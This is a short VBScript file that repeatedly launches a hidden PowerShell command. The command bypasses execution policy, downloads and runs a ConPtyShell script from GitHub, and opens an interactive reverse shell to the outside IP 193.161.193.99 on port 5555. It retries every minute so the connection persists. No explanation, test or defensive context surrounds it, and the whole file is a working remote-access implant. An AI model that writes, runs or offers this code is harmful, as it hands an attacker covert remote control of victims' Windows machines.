Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell -w hidden -nop -Exec bypass ""IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 193.161.193.99 5555""", 0, true
	WScript.Sleep(60000)
loop
